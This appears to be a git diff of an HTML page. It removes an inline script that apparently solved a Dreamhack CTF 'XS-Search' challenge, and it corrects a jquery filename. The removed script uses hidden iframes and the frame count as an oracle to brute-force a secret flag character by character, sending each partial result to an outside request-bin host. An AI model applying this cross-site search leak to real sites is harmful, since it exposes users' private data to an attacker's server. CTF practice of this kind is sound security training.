@@ -6,55 +6,6 @@
         <title>Document</title>
     </head>
     <body>
-        <script src="static/js/jquery,min.js"></script>
-    <h1>XS-Search Site</h1>
-
-        <script>
-        const requestbin = "https://uevaorw.request.dreamhack.games";
-
-        async function req(url) {
-            return new Promise((resolve, reject) => {
-                const fr = document.createElement("iframe");
-                fr.src = url;
-                fr.style.display = "none";
-
-                fr.onload = resolve(fr);
-                fr.onerror = reject(null);
-
-                document.body.appendChild(fr);
-            })
-        }
-
-        async function search(query) {
-            const ifr = await req(`http://localhost:8000/search?query=${query}`);
-
-            if (!ifr) return false;
-
-            const count = ifr.contentWindow.length;
-
-            document.body.removeChild(ifr);
-
-            return count > 0;
-        }
-
-        async function exploit() {
-            let chars = "_abcdefghijklmnopqrstuvwxyz0123456789"
-            let secret_length = 36;
-            let secret = "DH{";
-
-            for (let i = 0; i < secret_length; i++) {
-                for (let c of chars) {
-                    if (await search(secret + c)) {
-                        secret += c;
-                        fetch(`${requestbin}/?flag=${secret}`);
-                        console.log("Found: ", secret);
-                        break;
-                    }
-                }
-            }
-        }
-
-        exploit()
-    </script>
+        <script src="static/js/jquery.min.js"></script>
     </body>
 </html>
